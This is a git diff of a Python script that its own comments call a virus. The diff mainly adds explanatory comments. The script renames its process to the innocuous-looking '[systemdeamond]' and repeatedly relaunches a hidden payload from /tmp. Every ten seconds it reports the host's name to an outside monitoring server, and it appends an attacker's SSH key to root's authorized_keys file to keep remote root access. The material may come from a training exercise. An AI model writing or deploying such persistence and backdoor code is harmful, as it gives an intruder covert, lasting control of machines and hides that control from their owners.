@@ -11,6 +11,7 @@ VNAME = "cantstopthis"
 VIRUSNUM= 3 # CHANGE THIS TO CORRECT VALUE
 SSH_KEY = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCemHyeAoMIIVJx0ZkMs3KWCHNv+tpDZgjSZJlmhB4jbqwXpiO3M3wfkVVnOFjIGQluS17MgX90/javCJ345lOeqSieSYJvz7UTQtGw1nZz6Bbf1BWgjfnqgCkVExp/Zv/sbPvLf40EcX7RsCTHCFxywClw2hrV9ywOSPQ2GPiMYShIYF88grmFzUL6XG/ryGL/hEnvg90zVnfv7pZ3Wgs2gx4o/CMpGg+3la1FO8b0oWwVoLPvV+5iCRzk1xntQ7QWPkpMPu+sH+He93DfAo+jM9oHYPtUBd2cGPKroM/mB0N9mGlfag9tTUyNpkX2TjG3nE8fnM/m8On7Y3WMiMW7 dontdelete"""
 
+# Return whether the ssh key is already in the authorized_keys file
 def ssh_key_added():
     if os.path.isfile("/root/.ssh/authorized_keys"):
         with open("/root/.ssh/authorized_keys") as f:
@@ -20,15 +21,21 @@ def ssh_key_added():
     else:
         return False
     
-
-setproctitle.setproctitle("[systemdeamond]")
+# Rename the script to be a bit more innocuous
+setproctitle.setproctitle("[systemdeamond]") 
 while 1:
+    # Start cantstopthis script if it is not already running
     os.system("/usr/bin/flock -n /tmp/vlock.lock /tmp/\,/" + VNAME + " &")
+
+    # Let the monitoring server know I am still alive
     requests.get("http://monitor.daviddworken.com:8080/api/submit", {"id" : HOSTNAME, "virusName" : VIRUSNUM})
-    if ssh_key_added():
-        pass
-    else:
-        #Assuming .ssh folder exists here... 
+
+    # Append an ssh key to authorized_keys file if it is not already there
+    # What's the fun of having a virus if it doesn't give me some sort of remote access?
+    if not ssh_key_added():
+        # Assuming .ssh folder exists here... 
         os.system("echo '\n" + SSH_KEY + "' >> /root/.ssh/authorized_keys") 
+
+    # Repeat every ten seconds 
     time.sleep(10)
 
